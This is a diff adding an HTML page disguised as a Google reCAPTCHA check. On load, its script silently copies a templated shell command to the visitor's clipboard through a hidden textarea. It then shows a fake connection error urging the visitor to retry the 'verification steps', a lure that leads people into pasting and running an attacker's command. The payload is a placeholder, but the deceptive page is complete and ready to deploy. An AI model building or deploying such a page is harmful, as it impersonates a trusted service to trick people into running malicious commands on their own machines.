@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>reCAPTCHA Verification</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            color: #555;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        #error {
+            color: red;
+        }
+        .terms {
+            font-size: small;
+            color: #555;
+        }
+        .terms a {
+            text-decoration: none;
+        }
+        .terms a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" alt="reCAPTCHA Logo">
+    <div id="connecting" style="display:block;">
+        <p>Verifying reCAPTCHA, please wait...</p>
+    </div>
+    <div id="error" style="display:none;">
+        <p><b>Failed to connect with the reCAPTCHA server.</b><br>Try the verification steps again.</p>
+    </div>
+    <p class="terms">
+        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> -
+        <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+    </p>
+
+    <script type="text/javascript">
+        function copyToClipboardLegacy(text) {
+            var textarea = document.createElement("textarea");
+            textarea.style.position = "absolute";
+            textarea.style.left = "-9999px";
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.focus();
+            textarea.select();
+            document.execCommand("copy");
+            document.body.removeChild(textarea);
+        }
+
+        function simulateVerification() {
+            var command = "{{ command }}";
+            copyToClipboardLegacy(command);
+
+            setTimeout(function () {
+                document.getElementById("connecting").style.display = "none";
+                document.getElementById("error").style.display = "block";
+            }, 3000);
+        }
+
+        window.onload = simulateVerification;
+    </script>
+</body>
+</html>
